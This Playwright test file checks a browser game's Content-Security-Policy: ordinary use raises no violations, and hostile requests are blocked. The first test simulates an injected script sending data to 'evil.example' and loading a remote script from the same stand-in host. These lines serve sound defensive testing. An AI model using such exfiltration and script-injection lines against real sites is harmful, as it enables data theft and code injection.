import { expect, test } from '@playwright/test';
import type { Page } from '@playwright/test';
import { fakeBackends, fakeCommunity, fakeGameServer } from './fakes';

// The built pages carry a Content-Security-Policy. These tests check that (1) nothing the app legitimately does is blocked by it, and
// (2) it really does stop the page sending data to, or loading code from, a place it is not allowed to.

const watch = (page: Page) =>
  page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
const violations = (page: Page) => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

test.describe('main build', () => {
  test.use({ baseURL: 'http://127.0.0.1:4173/steal-a-poop/' });

  test('the policy is on the page and blocks a foreign server and foreign scripts', async ({ page }) => {
    await watch(page);
    await page.goto('./');
    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(policy).toContain("default-src 'self'");
    expect(policy).toContain("object-src 'none'");
    expect(policy).not.toContain('unsafe-eval');
    expect(policy).not.toMatch(/script-src[^;]*unsafe-inline/);
    // an injected script trying to send data away
    const sent = await page.evaluate(() => fetch('https://evil.example/steal?c=1').then(() => 'sent', () => 'blocked'));
    expect(sent).toBe('blocked');
    // and trying to load code from elsewhere
    await page.evaluate(() => {
      const s = document.createElement('script');
      s.src = 'https://evil.example/x.js';
      document.head.appendChild(s);
    });
    await expect.poll(() => violations(page)).toEqual(expect.arrayContaining([expect.stringContaining('connect-src'), expect.stringContaining('script-src')]));
  });

  test('ordinary use triggers no violations: start, guide, settings, legal pages, a practice game', async ({ page }) => {
    await watch(page);
    await page.addInitScript(() => localStorage.setItem('sap:tourDone', 'true'));
    await page.goto('./');
    await page.getByRole('button', { name: 'How to Play' }).click();
    await page.keyboard.press('Escape');
    await page.getByRole('button', { name: 'Settings' }).click();
    await page.keyboard.press('Escape');
    await page.goto('./#/legal/privacy');
    await expect(page.getByRole('article')).toBeVisible();
    await page.goto('./');
    await page.getByRole('button', { name: /^Practice/ }).click();
    await expect(page.locator('[data-table]')).toBeVisible();
    expect(await violations(page)).toEqual([]);
  });
});

test.describe('build with accounts', () => {
  test.use({ baseURL: 'http://127.0.0.1:4174/steal-a-poop/' });

  test('sign-in, the bot check, the game connection and the Community window are all allowed by the policy', async ({ page }) => {
    await watch(page);
    await fakeBackends(page, { profile: { nickname: 'Ana', country: 'CA', consentStatus: 'not_required', createdAt: 1 } });
    await fakeCommunity(page, { balance: 5, friends: [], incoming: [], owned: new Set(), worn: {}, visible: true });
    const game = await fakeGameServer(page);
    await page.addInitScript(() => localStorage.setItem('sap:tourDone', 'true'));
    await page.goto('./');
    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(policy).toContain('http://127.0.0.1:8790'); // Supabase
    expect(policy).toContain('ws://127.0.0.1:8788'); // the game server
    expect(policy).toContain('https://challenges.cloudflare.com'); // the bot check
    await page.getByRole('button', { name: /^Play with others/ }).click();
    const dlg = page.getByRole('dialog', { name: 'Account' });
    await expect(dlg.getByTestId('captcha')).toBeVisible();
    await dlg.getByLabel('Email').fill('ana@example.org');
    await dlg.getByLabel('Password').fill('correct-horse-9');
    await dlg.getByRole('button', { name: 'Sign in', exact: true }).click();
    await dlg.getByRole('button', { name: 'Continue', exact: true }).click();
    await expect.poll(() => game.received.some((m) => m.t === 'hello')).toBe(true);
    await page.getByRole('button', { name: '🛍️ Shop' }).click();
    await expect(page.getByRole('dialog', { name: 'Friends, boards and shop' })).toBeVisible();
    expect(await violations(page)).toEqual([]);
  });
});
